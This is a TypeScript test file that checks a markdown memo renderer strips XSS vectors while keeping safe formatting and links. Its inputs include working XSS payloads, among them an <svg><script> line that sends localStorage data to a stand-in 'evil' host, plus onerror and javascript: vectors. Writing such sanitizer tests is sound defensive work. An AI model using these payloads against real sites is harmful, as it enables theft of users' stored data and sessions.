import { describe, it, expect } from "vitest";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import { MEMO_REHYPE_PLUGINS, memoMarkdownComponents } from "../memoProse";

/**
 * Renders memo markdown exactly as the app does (rehype-raw + rehypeSanitizeMemo),
 * so these assertions exercise the real production render path.
 */
function renderMemo(md: string): string {
  return renderToStaticMarkup(
    React.createElement(
      ReactMarkdown,
      { rehypePlugins: MEMO_REHYPE_PLUGINS, components: memoMarkdownComponents },
      md,
    ),
  );
}

describe("memo XSS hardening (rehypeSanitizeMemo)", () => {
  it("strips the browser-verified <svg><script> vector", () => {
    const html = renderMemo(
      `Holding <svg><script>window.__pwned=1;fetch('https://evil/?t='+localStorage.getItem('x'))</script></svg> B.V. is in scope.`,
    );
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<svg");
    expect(html).not.toContain("__pwned");
    expect(html).not.toContain("evil");
    // surrounding prose text is preserved
    expect(html).toContain("Holding");
    expect(html).toContain("B.V. is in scope");
  });

  it("strips the browser-verified <iframe srcdoc> vector", () => {
    const html = renderMemo(
      `Entity <iframe srcdoc="&lt;script&gt;parent.localStorage&lt;/script&gt;"></iframe> Ltd.`,
    );
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("srcdoc");
    expect(html).toContain("Entity");
    expect(html).toContain("Ltd.");
  });

  it("strips inline event handlers and javascript: URLs", () => {
    const html = renderMemo(
      `<img src=x onerror="alert(1)">text <a href="javascript:alert(1)">link</a>`,
    );
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("<img");
    expect(html).toContain("link");
  });

  it("drops style, object, embed, and form carriers", () => {
    const html = renderMemo(
      `<style>*{}</style><object data="x"></object><embed src="x"><form action="x"></form>ok`,
    );
    expect(html).not.toContain("<style");
    expect(html).not.toContain("<object");
    expect(html).not.toContain("<embed");
    expect(html).not.toContain("<form");
    expect(html).toContain("ok");
  });

  it("keeps the legitimate memo formatting tags (u / sup / sub / br)", () => {
    const html = renderMemo(`Base<sup>1</sup> and <u>emphasis</u> and <sub>x</sub>.<br>next`);
    // memoMarkdownComponents renders <u> as an underline <span>, <sup>/<sub> as-is
    expect(html).toContain("<sup>1</sup>");
    expect(html).toContain("<sub>x</sub>");
    expect(html).toContain("underline"); // the <u> -> span.underline mapping
    expect(html).toContain("emphasis");
    expect(html).toContain("<br");
  });

  it("keeps safe links with a valid protocol", () => {
    const html = renderMemo(`See [the ruling](https://example.com/ruling).`);
    expect(html).toContain('href="https://example.com/ruling"');
    expect(html).toContain("the ruling");
  });
});
